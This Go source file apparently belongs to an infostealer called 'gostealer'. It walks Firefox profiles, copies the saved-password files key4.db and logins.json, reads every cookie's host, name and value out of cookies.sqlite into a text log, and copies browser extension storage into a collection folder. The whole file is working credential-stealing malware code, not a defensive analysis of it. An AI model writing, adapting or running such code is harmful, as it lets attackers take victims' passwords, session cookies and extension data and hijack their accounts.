package browsers

import (
	"database/sql"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path"
	"strings"

	"github.com/4kord/gostealer/utils"
)

func Firefox(browserPath, logFolderPath string) {

	profiles, _ := os.ReadDir(browserPath)

	for _, profile := range profiles {
		getFirefoxPasswords(path.Join(browserPath, profile.Name()), logFolderPath)

		browserCookies := getFirefoxCookies(path.Join(browserPath, profile.Name()), logFolderPath)

		err := os.WriteFile(path.Join(logFolderPath, "Browsers", "Firefox", "Cookies.txt"), []byte(browserCookies), 0644)
		if err != nil {
			log.Println(err)
		}

		if _, err := os.Stat(path.Join(browserPath, profile.Name(), "storage", "default")); !os.IsNotExist(err) {
			items, _ := ioutil.ReadDir(path.Join(browserPath, profile.Name(), "storage", "default"))
			for _, item := range items {
				if strings.Contains(item.Name(), "moz-extension") {
					utils.CopyFolderFiles(path.Join(browserPath, profile.Name(), "storage", "default", item.Name()), path.Join(logFolderPath, "Browsers", "Firefox", item.Name()))
				}
			}
		}
	}
}

func getFirefoxPasswords(browserPath, logFolderPath string) {
	files := []string{"key4.db", "logins.json"}

	for _, file := range files {

		if _, err := os.Stat(path.Join(browserPath, file)); !os.IsNotExist(err) {
			_, err := utils.CopyFile(path.Join(browserPath, file), path.Join(logFolderPath, "Browsers", "Firefox", file))
			if err != nil {
				log.Println(err)
				continue
			}
		}
	}
}

func getFirefoxCookies(browserPath, logFolderPath string) string {
	_, err := utils.CopyFile(path.Join(browserPath, "cookies.sqlite"), path.Join(logFolderPath, "raw", "firefox_cookies.sqlite"))
	if err != nil {
		log.Println(err)
		return ""
	}

	sqlitepath, err := sql.Open("sqlite", fmt.Sprintf("file:%s", path.Join(logFolderPath, "raw", "firefox_cookies.sqlite")))

	var data string

	if err != nil {
		log.Println(err)
		return ""
	}

	query, err := sqlitepath.Query("SELECT `host`, `path`, `expiry`, `name`, `value` FROM moz_cookies")

	if err != nil {
		log.Println(err)
		return ""
	}

	for query.Next() {
		cookie := CookieEntry{}
		err := query.Scan(&cookie.Host, &cookie.Path, &cookie.Expiry, &cookie.Name, &cookie.Value)
		if err != nil {
			log.Println(err)
			continue
		}

		data += fmt.Sprintf("Host: %s | Path: %s | Expiry: %d | Name: %s | Value: %s\n", cookie.Host, cookie.Path, cookie.Expiry, cookie.Name, cookie.Value)
		utils.CookieAmount++
	}

	return data
}
